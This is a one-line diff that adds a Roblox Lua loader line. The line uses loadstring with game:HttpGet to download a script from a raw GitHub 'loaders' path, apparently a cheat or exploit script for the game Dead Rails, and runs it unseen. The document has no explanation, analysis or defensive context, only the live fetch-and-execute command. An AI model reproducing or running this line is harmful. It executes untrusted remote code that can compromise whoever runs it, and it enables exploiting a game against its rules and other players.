@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/event-dead-rails-spam2-4bkmrqovhxw91p.lua"))()
